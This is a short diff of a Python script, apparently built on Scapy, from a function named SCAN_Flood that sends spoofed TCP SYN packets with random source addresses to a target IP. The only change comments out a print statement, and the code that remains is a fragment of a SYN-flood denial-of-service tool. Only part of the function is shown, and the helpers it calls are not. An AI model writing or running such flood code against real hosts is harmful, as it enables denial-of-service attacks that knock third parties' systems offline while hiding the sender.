@@ -31,6 +31,6 @@ def SCAN_Flood(targetIP, numPackets):
 
             # Send spoofed TCP SYN packet
             send(IP(src=randomIP(), dst=targetIP)/TCP_Packet, verbose=0)
-            print(f"Sent packet to {targetIP}:{port}")
+            #print(f"Sent packet to {targetIP}:{port}")
 
 #SCAN_Flood('127.0.0.1', 1)
